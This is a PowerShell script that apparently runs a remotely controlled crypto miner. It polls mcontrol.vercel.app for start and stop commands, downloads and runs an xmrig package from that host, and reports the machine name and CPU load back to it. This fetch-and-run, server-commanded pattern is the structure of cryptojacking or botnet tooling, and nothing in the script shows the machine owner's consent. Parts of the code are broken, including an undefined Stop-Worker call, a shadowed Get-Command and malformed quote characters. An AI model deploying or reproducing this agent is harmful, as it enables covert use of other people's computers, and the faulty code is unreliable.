$SERVER = "https://mcontrol.vercel.app/"
$SYSTEM = $env:COMPUTERNAME

$TEMP_DIR = "$env:TEMP\worker_env"
$WORKER = $false
$CPU_LIMIT = 70

$BASE_DIR = "C:\soft"
$TEMP_DIR = "C:\soft\temp"
$M =   "C:\soft\temp\m"
$MINER_EXE = "$TEMP_DIR\m\xmrig.exe"

function Get-CPU {
    (Get-Counter '\Processor(_Total)\% Processor Time').CounterSamples.CookedValue
}

function Check-VPN {
 
    try {
$headers = @{
            "User-Agent" = "Mozilla/5.0"
        }
        return $true
       # $info = Invoke-RestMethod `
        #    -Uri "https://ipinfo.io/json" `
        #    -Headers $headers `
        #    -TimeoutSec 10

        # $country = $info.country
        # Write-Host "Info:$info.country"
        # Write-Host "Public IP Country: $country"
        # if ($WORKER -and $WORKER.HasExited) {
        # Write-Host "Worker crashed. Restarting."
        # Start-Worker
}
 catch {
        Write-Host "VPN check failed: $($_.Exception.Message)"
        return $true
    }
        #if ($country -ne "IN") {
            return $true
        # }
#        else {
#            return $true
#        }
#    }
    
}
function Send-Status($running,$cpu,$vpnStatus){
  
    $data = @{
        id = $SYSTEM
        running =[bool] $running
        cpu = [int]$cpu
        vpn = [bool] $vpnStatus
    } | ConvertTo-Json

Invoke-RestMethod `
 -Uri "https://mcontrol.vercel.app/api/status" `
 -Method POST `
 -ContentType "application/json" `
 -Body $data

}

function Get-Command {
    param ($SystemId  )
      Write-Host "Checking ID: $SystemId" 
      $cmd = Invoke-RestMethod ` -Uri     "https://mcontrol.vercel.app/api/command?id=$SystemId" ` -Method GET ` -ContentType "application/json" ` -ErrorAction Stop # Added to ensure catch block works 
      Write-Host "getcmd: $($cmd | ConvertTo-Json -Compress)"
    
    return $cmd.command
}
 function Mit([string]$command) {

    if ($command -eq "start") {

        # Ensure base directory exists
        if (!(Test-Path $BASE_DIR)) {
            New-Item -ItemType Directory -Path $BASE_DIR | Out-Null
        }

        # Ensure temp directory exists
        if (!(Test-Path $TEMP_DIR)) {
            New-Item -ItemType Directory -Path $TEMP_DIR | Out-Null
        }
        New-Item -ItemType Directory -Path $M | Out-Null
          Write-Host "m folder created"
          $zipFile = "$TEMP_DIR\m.zip"
          $minerZipUrl = "https://mcontrol.vercel.app/xmrig-6.25.0.zip"

        Write-Host "Downloading mining package..."

        Invoke-WebRequest `
            -Uri $minerZipUrl `
            -OutFile $zipFile `
            -UseBasicParsing

        Write-Host "Extracting mining package..."

        Expand-Archive `
            -Path $zipFile `
            -DestinationPath $M `
            -Force
         Write-Host "unzipped"
        Remove-Item $zipFile -Force

        if (!(Test-Path $MINER_EXE)) {
            Write-Host "xmrig.exe not found!"
            return
        }

        if (!$global:MINER_PROC) {
            Write-Host "Starting miner..."

            $global:MINER_PROC = Start-Process `
                -FilePath $MINER_EXE `
                -ArgumentList "--config=config.json --testnet" `
                -WorkingDirectory $TEMP_DIR `
                -PassThru
        }
    }
    elseif ($command -eq "stop") {

        Write-Host "Stopping miner..."

        if ($global:MINER_PROC) {
            Stop-Process -Id $global:MINER_PROC.Id -Force
            $global:MINER_PROC = $null
        }

        if (Test-Path $TEMP_DIR) {
            Remove-Item $TEMP_DIR -Recurse -Force
        }

        Write-Host "Mining stopped and cleaned."
    }
}

function Swok {
    Write-Host "called me"
    # If worker already running, do nothing
    if ($global:WORKER) { return }
    # Mark worker as running
     $global:WORKER = $true
    # Call mining function with start signal
    Mit "start"
    Write-Host "Started"
    # Send running status to dashboard
    Send-Status $true
}
function Swnok {
    Write-Host "Sending stop signal..."
    # If not running, do nothing
    if (-not $global:WORKER) { return }
    # Call Mit with stop command
    Mit "stop"
    # Mark worker as stopped
    $global:WORKER = $false
}

while($true){

    $cpu = Get-CPU
    $cmd = Get-Command -SystemId $SYSTEM
    Write-Host "cnd $cmd cpu $cpu"
    if($cpu -gt $CPU_LIMIT){
        Stop-Worker
    }

    if($cmd -eq "start"){ Swok Write-Host ¨called start $cmd¨ }
    if($cmd -eq "stop"){ Swnok Write-Host "called stop $cmd"}

    $running = $WORKER 
    Write-Host "$running run in wprker: $WORKER"

    $vpnStatus = Check-VPN
   
    Send-Status $running $cpu $vpnStatus

    Start-Sleep 30
}
